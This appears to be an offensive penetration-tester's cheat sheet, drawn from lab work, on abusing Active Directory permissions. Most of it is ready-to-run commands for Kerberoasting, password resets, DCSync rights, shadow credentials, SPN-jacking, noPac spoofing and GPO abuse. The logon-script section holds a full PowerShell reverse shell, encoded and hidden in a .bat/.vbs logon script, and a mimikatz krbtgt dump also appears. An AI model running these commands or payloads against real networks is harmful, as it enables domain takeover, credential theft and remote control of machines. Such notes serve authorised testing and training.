---
description: ACL | DACL | ACE | Tokens | Security
---

# DACL

### <mark style="color:yellow;">ACL Enumeration</mark>

```powershell
# Get rights of user
$sid = Convert-NameToSid mczen
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

# Get usernames in domain
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName
Get-DomainUser -Properties samaccountname

# Check rights over other users
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'ZENCORP\\mczen'}}
$guid= "00299570-246d-11d0-a768-00aa006e0529" 
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl 
```

### <mark style="color:yellow;">View ACLs</mark>

```powershell
# View ACLs of user
dsacls.exe "cn=John,cn=users,dc=zencorp,dc=local"

# More permssions user has over other user
dsacls.exe "cn=John,cn=users,dc=zencorp,dc=local" | Select-String "James"
```

#### Using AccessChk

```powershell
.\accesschk64.exe -p "explorer.exe" -l
```

### <mark style="color:yellow;">dacledit.py</mark>

Identifying Principals with Control over Another Account.

```bash
dacledit.py -target john.doe -dc-ip 10.129.205.81 zencorp.local/htb-student:'pass@123'       
```

### <mark style="color:yellow;">Kerberoasting</mark>

If an account has the ability to edit the Service Principal Name attribute of another user they can make that account vulnerable to Kerberoasting attack. This is possible when the controlled account has `GenericAll`, `GenericWrite`, `WriteProperty`, `WriteSPN` or `Validated-SPN` over the target.

#### View user John rights over James

```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Import-Module .\PowerView.ps1
$userSID = (Get-DomainUser -Identity john).objectsid
Get-DomainObjectAcl -Identity james | ?{$_.SecurityIdentifier -eq $userSID}
```

#### Targeted Kerberoasting from Linux

```bash
targetedKerberoast.py -vv -d zencorp.local -u john -p pass132 --request-user james --dc-ip 10.129.205.81
```

{% hint style="info" %}
Fix clock skew error: sudo ntpdate dc\_ip\_adress
{% endhint %}

#### Targeted Kerberoasting from Windows

```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Import-Module .\PowerView.ps1
Get-DomainUser John | Select serviceprincipalname

# Set SPN
Set-DomainObject -Identity John -Set @{serviceprincipalname='fakespn/DOESNOTMATTER'} -Verbose

# Get John hash
$User = Get-DomainUser John
$User | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash

# Clear SPN
Set-DomainObject -Identity John -Clear serviceprincipalname -Verbose
```

### <mark style="color:yellow;">AddMembers</mark>

Having the ability to edit group's member attribute its possible to add new users to that group. This can happen with `GenericAll`, `GenericWrite`, `Self`, `AllExtendedRights`, or `Self-Membership` over the target group.

#### Check rights from Linux

```bash
dacledit.py -principal holly -target 'Backup Operators' -dc-ip 10.129.205.11 zencorp.local/john:password123
```

#### Add member from Linux

```bash
# Check group membership
net rpc group members 'Backup Operators' -U zencorp.local/john%pass123 -S 10.129.205.81

# ADd holly to Backup Operators
net rpc group addmem 'Backup Operators' holly -U zencorp.local/john%pass123 -S 10.129.205.81
```

If acces denied use addusertogroup.py

```bash
addusertogroup.py -d zencorp.local -g "Backup Operators" -a holly -u john -p pass132
```

{% embed url="https://github.com/juliourena/ActiveDirectoryScripts/blob/main/Python/addusertogroup.py" %}

Check rights from Windows

```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Import-Module .\PowerView.ps1
$userSID = (Get-DomainUser -Identity pedro).objectsid
Get-DomainObjectAcl -Identity 'Backup Operators' -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $userSID}
```

Add Member from Windows

```powershell
# Check group membership
net localgroup "Backup Operators"
net group "Backup Operators" /domain

# Add Member
Add-DomainGroupMember -Identity "Backup Operators" -Members john 
```

{% hint style="info" %}
&#x41;_&#x73; member of backup and with SeBackupPrivileg we can copy SAM & SYSTEM hive but also need NTDS.dit since its AD. This can be done by creating a Shadow Copy and RoboCopy._
{% endhint %}

### <mark style="color:yellow;">ForceChangePassword</mark>

Extended access right that allows users to reset the passwords of other accounts. Possible with `GenericAll`, `AllExtendedRights`, or `User-Force-Change-Password`.

#### Check rights

```bash
dacledit.py -principal john -target holly -dc-ip 10.129.205.81 zencorp.local/pedro:pass123
```

#### Change password

```bash
net rpc password holly newpass123 -U zencorp.local/john%pass123 -S 10.129.205.81
```

Change password Windows

```powershell
Set-DomainUserPassword -Identity holly -AccountPassword $((ConvertTo-SecureString 'newpass123' -AsPlainText -Force)) -Verbose

# With AD module
Set-ADAccountPassword yolanda -NewPassword $((ConvertTo-SecureString 'NewpasswordfromW2' -AsPlainText -Force)) -Reset -Verbose
```

### <mark style="color:yellow;">ReadLAPSPassword</mark>

Microsoft's [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) allows companies to manage their local admin passwords. See [laps.md](../../windows/knowledge-base/laps.md "mention")

#### Read password from Windows

```powershell
# Using powerview
Get-DomainObject -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name

# AD Module
Get-ADComputer -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name
```

#### Read password from Linux

```bash
laps.py -u holly -p Password123 -l 10.129.205.81 -d zencorp.local
```

### <mark style="color:yellow;">ReadGMSAPassword</mark>

```bash
gMSADumper.py -d zencorp.local -l 10.129.205.81 -u john -p pass123
```

From windows

```powershell
GMSAPasswordReader.exe --accountname apache-dev
```

### <mark style="color:yellow;">WriteDacl</mark>

With WriteDacl we can give DCSync rights.

```bash
dacledit.py -principal holly -target-dn dc=zencorp,dc=local -dc-ip 10.129.205.11 zencorp.local/holly:pass123 -action write -rights DCSync
```

From Windows

```
# Powerview
Add-DomainObjectAcl -TargetIdentity $(Get-DomainSID) -PrincipalIdentity holly -Rights DCSync -Verbose
```

### <mark style="color:yellow;">WriteDacl abusing objects</mark>

```bash
# Modify DACL over Finance group by adding full control
python3 dacledit.py -principal holly -target "Finance Managers" -dc-ip 10.129.205.11 zencorp.local/holly:pass123 -action write

# Add user to group
python3 addusertogroup.py -d zencorp.local -g "Finance Managers" -a holly -u holly -p DACLPass123
```

### <mark style="color:yellow;">WriteDacl abusing users</mark>

With WriteDacl grant GenericAll

```bash
python dacledit.py -action write -rights 'FullControl' -principal holly -target 'james' zencorp.local/holly:'pass123' 
```

The Change password or targeted kerberoast

```bash
net rpc password james ssap123 -U zencorp.local/holly%pass123 -S 10.129.205.81
```

### <mark style="color:yellow;">WriteOwner</mark>

A user with WriteOwner privileges hass the ability to modify the owner of the group. To change owernship:

```bash
python3 owneredit.py -action write -new-owner mathew -target 'NETWORK ADMINS' -dc-ip 10.129.218.254 zencorp.local/mathew:ilovejesus
```

If you need permission give yourself AddMember privileges.

```bash
python3 dacledit.py -principal mathew -target 'NETWORK ADMINS' -dc-ip 10.129.218.254 zencorp.local/mathew:ilovejesus -action write -rights FullControl
```

Then add yourself to the group:

```bash
net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```

Verify if user was added to the group:

```bash
net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DC01.domain.com"
```

### <mark style="color:yellow;">Shadow Credentials</mark>

Shadow Credentials abuses Windows Hello for Business, it works by adding Key Credentials to `msDS-KeyCredentialLink` attribute of the target user/computer and then performing Kerberos authentication as that account using PKINIT which doesnt use pre-authentication but a certificate.

{% hint style="info" %}
A Shadow Credential Attack is gaining control over a user/computer by exploiting the password authentication function by adding an alternate credential as a certificate.
{% endhint %}

#### Enumeration

```powershell
# Enumeration from windows
$userSID = (Get-DomainUser -Identity jeffry).objectsid
Get-DomainObjectAcl -Identity gabriel | ?{$_.SecurityIdentifier -eq $userSID}

# Enumeration from Linux
python3 dacledit.py -target gabriel -principal jeffry -dc-ip 10.129.228.236 zencorp.local/jeffry:pass123 
```

#### Abusing Shadow Credentials from Windows

```powershell
# Get attribute value
.\Whisker.exe list /target:gabriel

# Generate certificate and open with Rubeus
.\Whisker.exe add /target:gabriel

# Open with Rubues
Rubeus.exe asktgt /user:gabriel /certificate:MIIJuAIBAzCCCXQGC..SNIP...6F9yJkzw28UnNcCs/0aclXHfAwICB9A= /password:"cw7I7QaHMS44q5xt" /domain:lab.local /dc:LAB-DC.lab.local /getcredentials /show

# Create sacrificial session
.\Rubeus.exe createnetonly /program:powershell.exe /show

# And then pass the ticket
.\Rubeus.exe ptt /ticket:doIGJjCCBiKgAwIBBaEDAgEWooIFRTCCBUFhggU9MIIFOaADA...SNIP...
```

#### Abusing Shadow Credentials from Linux

```bash
# Shadow Creds attack
python3 pywhisker.py -d lab.local -u jeffry -p Music001 --target gabriel --action add

# Shadow creds using certipy
proxychains -q certipy shadow auto -username restituyo@zencorp.local -hashes :98b590665f1025577b5b9bdc081927bb -account 'tangui' -dc-ip 172.19.99.10 -target dc04.zencorp.local -scheme ldap

# Use gettgtpkinit.py to generate TGT
python3 gettgtpkinit.py -cert-pfx ../pywhisker/BX4EWk8m.pfx -pfx-pass KQAx5lHP3h9TtzNly2Us lab.local/gabriel gabriel.ccache

# Use TGT to get hash
KRB5CCNAME=gabriel.ccache python3 getnthash.py -key 46c30d948cbe2ab0749d2f72896692c18673e9a4fae6438bff32a33afb49245a lab.local/gabriel 

# Use NT hash or TGT to impersonate.
KRB5CCNAME=gabriel.ccache smbclient.py -k -no-pass LAB-DC.LAB.LOCAL 
```

### <mark style="color:yellow;">**Logon Script**</mark>

Abuse can be done when controlling an object that has a `GenericAll` or `GenericWrite` over the target, or a `WriteProperty` premission over the target's logon script attribute (i.e. `scriptPath` or `msTSInitialProgram`).

The attacker can make the user execute a custom script at logon.

#### Enumeration from Linux

```bash
# Use pywerview
pywerview get-objectacl --name 'wayne' -w zencorp.local -t 10.129.229.224 -u 'john' -p 'pass123' --resolve-sids --resolve-guids

# Filter by name
 pywerview get-objectacl --name 'eric' -w zencorp.local -t 10.129.229.224 -u 'john' -p 'pass123' --resolve-sids --resolve-guids --json | jq '.results | map(select(.securityidentifier | contains("david")))'
 
 # Get ACEs
 python dacledit.py -principal 'john' -target 'holly' -dc-ip 10.129.229.224 zencorp.local/'david':'pass123'
```

Using Adalanche to find edges with ScriptPath as bloodhound does not show those.

```bash
./adalanche-linux-x64-v2024.1.11-43-g7774681 collect activedirectory --domain zencorp.local --server 10.129.229.224  --username 'john' --password 'pass123'
./adalanche-linux-x64-v2024.1.11-44-gf1573f2 analyze --datapath data
```

#### Enumeration from Windows

Save SID and use `Get-DomainObjectAcl` to get ACEs or target, where `ActiveDirectoryRights` shows `ReadProperty`, `WriteProperty` over `ObjectAceType` with`Script-Path`.

```powershell
Import-Module .\PowerView.ps1
$DavidSID = (Get-DomainUser -Identity david).objectSI
Get-DomainObjectAcl -Identity eric -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $DavidSID}
```

### <mark style="color:yellow;">Abusing Write scriptPath from Linux</mark>

If find that you have a user with write and read is might be possible to get a reverse shell:

#### Enumerate logon share for write permission in it.

```bash
# List Folders in NETLOGON
smbclient //10.129.229.224/NETLOGON -U john%'pass123' -c "ls"

# View ACLs
smbcacls //10.129.229.224/NETLOGON /EricsScripts -U john%'pass123'
```

#### NETLOGON create a .bat or .vbs file which runs a Powershell reverse shell

```bash
# Convert to UTF-16LE then b64 encoded
python3 -c 'import base64; print(base64.b64encode((r"""$LHOST = "10.129.229.84"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()""").encode("utf-16-le")).decode())'

# Within a .bat file
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABMAEgATwBTA <snip>

# Within a .vbs file
CreateObject("Wscript.shell").Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABMAEgATwBTAFQAIAA9ACAAIgAxADAALgAxADI <snip>

# Upload file
smbclient //10.129.229.224/NETLOGON --directory EricsScripts -U john%'pass123' -c "put logonScript.bat"
```

#### Update users scriptPath to that payload.

```bash
# Set relative path to logon script
ldapmodify -H ldap://10.129.229.224 -x -D 'john@zencorp.local' -w 'pass132' -f logonScript.ldif

# Or with bloodyAD
bloodyAD --host "10.129.229.224" -d "zencorp.local" -u "john" -p 'pass123' set object eric scriptPath -v 'EricsScripts\logonScript.bat'

# Check if update the attribute
bloodyAD --host "10.129.229.224" -d "zencorp.local" -u "john" -p 'pass123' get object eric --attr scriptPath
```

### <mark style="color:yellow;">Abusing Write scriptPath from Windows</mark>

```powershell
# Check NETLOGON share
ls $env:LOGONSERVER\NETLOGON

# Check Permssions with icacls
icacls $env:LOGONSERVER\NETLOGON\JohnsScripts

# Or use ScriptSentry
.\Invoke-ScriptSentry.ps1
```

#### Modify target's path

```powershell
# Set location of payload
Set-DomainObject eric -Set @{'scriptPath'='EricsScripts\logonScript.bat'}

# Check for update attribute
Get-DomainObject eric -Properties scriptPath
```

### <mark style="color:yellow;">Ghost SPN-Jacking</mark>

First look for `WriteSPN` on bloodhound or using PowerView for `WriteProperty`

```powershell
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $(ConvertTo-SID gabriel)}
```

Then check for owned computer if `Constrained Delegation` is enabled.

```powershell
Get-DomainComputer -TrustedToAuth | select name, msds-allowedtodelegateto
```

Search for server configured for `Constrained Delegation` including values. Using the `-CheckOrphaned` flag we will find orphaned SPNs.

```powershell
Import-Module C:\Tools\PowerView.ps1
Import-Module C:\Tools\Get-ConstrainedDelegation.ps1
Get-ConstrainedDelegation -CheckOrphaned
```

Assign orphaned SPN to target machine by misaligning the SPNs, no longer point to serverA but to serverB.

```powershell
Set-DomainObject -Identity WEB01 -Set @{serviceprincipalname='dhcp/DATABASE01'} -Verbose
```

SPN pointing to new server we can now get a service ticket to that server. Use mimikatz or Shadow Credentials to get the hash of serverA.

```powershell
.\Rubeus.exe s4u /domain:zencorp.local /user:SRV01$ /rc4:ef3d150ee77eb9000001236c52bd2793 /impersonateuser:administrator /msdsspn:"dhcp/DATABASE01" /nowrap
```

The new ticket obtained wont provide access because the hostname is incorrect. Changing to another service like CIFS would fix this. While the ticket is encrpyted the service name is not so it possible to alter the service name.

```powershell
.\Rubeus.exe tgssub /ticket:<SNIP> /altservice:cifs/WEB01 /nowrap
```

Finally pass the ticket and gain access

```powershell
# Pass the ticket
.\Rubeus.exe ptt /ticket:doIGpjCCBqKgAwIBBaEDAgEWooIFsTCCBa1h<SNIP>

# Access
ls \\web01\c$
```

### <mark style="color:yellow;">Live SPN-Jacking</mark>

Start with looking for a SPN to abuse, clear it and reassign.

```powershell
# List SPNs
Get-DomainComputer DBSRV003 -Properties 'serviceprincipalname' | Select-Object -ExcludeProperty serviceprincipalname

# Clear SPN 
Set-DomainObject -Identity DBSRV003 -Clear 'serviceprincipalname' -Verbose

# Assign SPN
Set-DomainObject -Identity WEB01 -Set @{serviceprincipalname='dmserver/DBSRV003'} -Verbose
```

Then request a ticket using Rubeus

```powershell
.\Rubeus.exe s4u /domain:zencorp.local /user:SRV01$ /rc4:ef3d150ee77eb9000001236c52bd2793 /impersonateuser:administrator /msdsspn:"dmserver/DBSRV003" /nowrap
```

Again because of the service name on ticket incorrect we have to change the service name and host name.

```powershell
.\Rubeus.exe tgssub /ticket:doIGtDCCBrCgAwIBBaEDAgEWooIF<SNIP> /altservice:HTTP/WEB01 /nowrap
```

And finally pass the ticket

```powershell
# Pass the ticket
.\Rubeus.exe ptt /ticket:doIGpjCCBqKgAwIBBaEDAgEWooIFsTCCBa1h<SNIP>

# New PowerShell Session
Enter-PSSession -ComputerName WEB01
```

### <mark style="color:yellow;">Live SPN Jacking from Linux</mark>

First look for accounts with Constrained Delegation rights.

```bash
findDelegation.py -target-domain zencorp.local -dc-ip 172.16.92.10 -dc-host dc02 zencorp.local/gabriel:Godisgood001
```

Use addspn.to clear the SPN

```bash
python3 addspn.py 172.16.92.10 -u 'zencorp.local\gabriel' -p Godisgood001 --clear -t 'DBSRV003$' -dc-ip 172.16.92.10
```

Add SPN to target machine.

```bash
python3 addspn.py 172.16.92.10 -u 'zencorp.local\gabriel' -p Godisgood001 --spn 'dmserver/DBSRV003' -t 'WEB01$' -dc-ip 172.16.92.10
```

Get more details about a ticket

```bash
describeTicket.py Administrator@dmserver_DBSRV003@ZENCORP.LOCAL.ccache
```

Replace SPN in ticket

```bash
python3 tgssub/examples/tgssub.py -in Administrator@dmserver_DBSRV003@INLANEFREIGHT.LOCAL.ccache -altservice "cifs/WEB01" -out newticket.ccache
```

Finally connect to target

```bash
KRB5CCNAME=newticket.ccache proxychains4 -q smbexec.py -k -no-pass WEB01
```

{% hint style="info" %}
All of the aboven in 1 command for Live SPN jacking

```
getST.py -spn 'dmserver/DBSRV003' -impersonate Administrator 'inlanefreight.local/SRV01$' -hashes :ef3d150ee77eb9000001236c52bd2793 -dc-ip 172.16.92.10 -altservice "cifs/WEB01.zencorp.local"
```
{% endhint %}

### <mark style="color:yellow;">sAMAccountName Spoofing</mark>

In Active Directory computers account names end with a `$` to distinguish them from user accounts. With right permissions its possible to change the `sAMaccountName` to the account name of a domain controller without `$`. Then trick the KDC by requesting a service ticket for a non-existent account it will append a `$` and search again.

<details>

<summary>Privilege Attribute Certificate (PAC)</summary>

The `Privilege Attribute Certificate (PAC)` is a data structure used in Kerberos authentication . The KDC includes a PAC in the TGT which is later used to determine user's permissions. A PAC contains:

* User SID.
* Group SIDs.
* User rights.
* Logon information.

</details>

#### Enumeration from Windows

```powershell
# Scan with nopac
.\noPac.exe scan -domain zencorp.local -user aneudy -pass Ilovemusic01

# Get MachineAccountQuota
(Get-DomainObject -SearchScope Base)."ms-ds-machineaccountquota"
```

{% hint style="info" %}
A user can join up to 10 machines, after that no more. This is important to understand as we may get access to an account that has already reached that quota.
{% endhint %}

Query number of machines an account has joined

```powershell
# Find creator of machine
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> $computerName = 'COMPUTERTEST1'
PS C:\Tools> $computer = Get-DomainComputer -Identity $computerName -Properties 'ms-DS-CreatorSID'
PS C:\Tools> $sid = (New-Object System.Security.Principal.SecurityIdentifier($computer.'ms-DS-CreatorSID', 0)).Value
PS C:\Tools> ConvertFrom-SID $sid
ZENCROP\john

# Find how many machines creator created
PS C:\Tools> $computers = Get-DomainComputer -Filter '(ms-DS-CreatorSID=*)' -Properties name,ms-ds-creatorsid
PS C:\Tools> $aneudyComputers = $computers | where { (New-Object System.Security.Principal.SecurityIdentifier($_."ms-ds-creatorsid",0)).Value -eq (ConvertTo-SID aneudy) }
PS C:\Tools> $aneudyComputers.Count
10
```

### <mark style="color:yellow;">Abusing sAMAccountName Spoofing from Windows</mark>

First start with creating a computer account

```powershell
Import-Module .\Powermad.ps1
$password = ConvertTo-SecureString 'Password123' -AsPlainText -Force
New-MachineAccount -MachineAccount "TEST01" -Password $($password) -Domain zencorp.local -DomainController 172.18.88.10 -Verbose
```

Clear the SPNs

```powershell
Import-Module .\PowerView.ps1
Set-DomainObject -Identity 'TEST01$' -Clear 'serviceprincipalname' -Domain zencorp.local -DomainController 172.18.88.10 -Verbose
```

Impersonate DC by chaning account name

```powershell
Set-MachineAccountAttribute -MachineAccount "TEST01" -Value "dc03" -Attribute samaccountname -Domain zencorp.local -DomainController 172.18.88.10 -Verbose
```

Request a ticket with TEST01 credentials, it will get DC info back

```powershell
.\Rubeus.exe asktgt /user:dc03 /password:"Password123" /domain:zencorp.local /dc:172.18.88.10 /nowrap
```

Revert the TEST01 sAMAccountName to original value

```powershell
Set-MachineAccountAttribute -MachineAccount "TEST01" -Value "TEST01" -Attribute samaccountname -Domain zencorp.local -DomainController 172.18.88.10 -Verbose
```

Finally use ticket to request a Service Ticket in this case for DCSync.

```powershell
# Get Ticket
.\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:"ldap/dc03.zencorp.local" /dc:172.18.88.10 /ptt /ticket:doIFJDC

# DCSync
.\mimikatz.exe "lsadump::dcsync /domain:zencorp.local /kdc:dc03.zencorp.local /user:krbtgt" exit
```

### <mark style="color:yellow;">Abusing sAMAccountName Spoofing from Linux</mark>

Enumeration

```bash
python3 noPac/scanner.py -dc-ip 10.129.229.224 zencorp.local/aneudy:Ilovemusic01 -use-ldap
```

With GenericAll/FullControl or GenericWrite, check for SPNs

```bash
python3 bloodyAD.py -d zencorp.local -u aneudy -p Ilovemusic01 --host 10.129.229.224 get object felipe | grep "servicePrincipalName\|sAMAccountName
```

Clear the SPN

```bash
python3 bloodyAD.py -d zencorp.local -u aneudy -p Ilovemusic01 --host 10.129.229.224 set object felipe servicePrincipalName
```

Modify the sAMAccountName to match the DC without the `$`.

```bash
bloodyAD.py -d zencorp.local -u aneudy -p Ilovemusic01 --host 10.129.229.224 set object felipe sAMAccountName -v DC03
```

Request a TGT for DC account using user creds

```bash
getTGT.py zencorp.local/dc03:Hacker0039 -dc-ip 10.129.229.224 
```

Revert the sAMAccountName

```bash
bloodyAD.py -d zencorp.local -u aneudy -p Ilovemusic01 --host 10.129.229.224 set object DC03 sAMAccountName -v felipe
```

Request a S4U2self service ticket with dc.cache

```bash
KRB5CCNAME=dc03.ccache getST.py zencorp.local/dc03 -self -impersonate 'Administrator' -altservice 'cifs/dc03.zencorp.local' -k -no-pass -dc-ip 10.129.229.224
```

And finally gain access

```bash
KRB5CCNAME=Administrator@cifs_dc03.zencorp.local@ZENCORP.LOCAL.ccache psexec.py dc03.zencorp.local -k -no-pass
```

### <mark style="color:yellow;">GPO Attacks</mark>

Several rights can be abused to escalate privileges using GPO.

1. Modify a GPO: Can be used to alter the GPO like executing commands or actions to computer where GPO is applied.
2. Link to a GPO: Link GPO to a site, domain or OU, needs right to modify as well.
3. Create a GPO: Combined with LInk to GPO we can compromise any computer.

#### Enumeration from Windows

```powershell
# Get-DomainOU
Import-Module .\PowerView.ps1
Get-DomainOU -Properties name,gplink

# Get name of GPO usin Guid
Get-GPO -Guid 8F3E10E7-E9FC-43C7-A58F-3ECFFBF69756

# User GPO Enumeration
Import-Module .\Get-GPOEnumeration.ps1
Get-GPOEnumeration

# More User GPO Enumeration
Get-DomainSite -Properties distinguishedname | foreach { Get-DomainObjectAcl -SearchBase $_.distinguishedname -ResolveGUIDs | where { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, @{Name='ResolvedSID';Expression={ConvertFrom-SID $_.SecurityIdentifier}} | Format-List }

# Which user can link GPOs to Servers OU
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | where { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, @{Name='ResolvedSID';Expression={ConvertFrom-SID $_.SecurityIdentifier}} | Format-List
```

#### GPO Abuse from Windows

```powershell
# Search users with rights to modify GPO
Get-GPOEnumeration -ModifyGPOs

# Query computer validating OU
Get-DomainComputer web01 -Properties distinguishedname
```

Add to local admin group and link GPO

```powershell
# Add to local admin group
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount gabriel --GPOName TestGPO

# Link GPO
New-GPLink -Name TestGPO -Target "OU=Servers,DC=inlanefreight,DC=local"
```
